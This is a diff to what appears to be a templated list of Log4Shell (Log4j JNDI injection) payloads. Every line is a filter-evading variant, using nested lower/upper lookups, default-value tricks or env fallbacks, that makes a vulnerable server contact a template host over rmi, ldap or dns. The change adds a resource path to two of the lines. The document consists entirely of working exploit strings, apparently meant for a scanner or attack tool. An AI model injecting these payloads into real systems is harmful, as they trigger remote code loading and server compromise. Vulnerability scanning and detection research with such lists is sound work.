@@ -1,9 +1,9 @@
 ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{ .CADDR }}/{{ .Resource }}}
 ${${::-j}ndi:rmi://{{ .CADDR }}/{{ .Resource }}}
-${jndi:rmi://{{ .CADDR }}}
+${jndi:rmi://{{ .CADDR }}/{{ .Resource }}}
 ${${lower:jndi}:${lower:rmi}://{{ .CADDR }}/{{ .Resource }}}
 ${${lower:${lower:jndi}}:${lower:rmi}://{{ .CADDR }}/{{ .Resource }}}
 ${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{ .CADDR }}/{{ .Resource }}}
 ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{ .CADDR }}/{{ .Resource }}}
-${jndi:dns://{{ .CADDR }}}
+${jndi:dns://{{ .CADDR }}/{{ .Resource }}}
 ${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//{{ .CADDR }}/{{ .Resource }}}
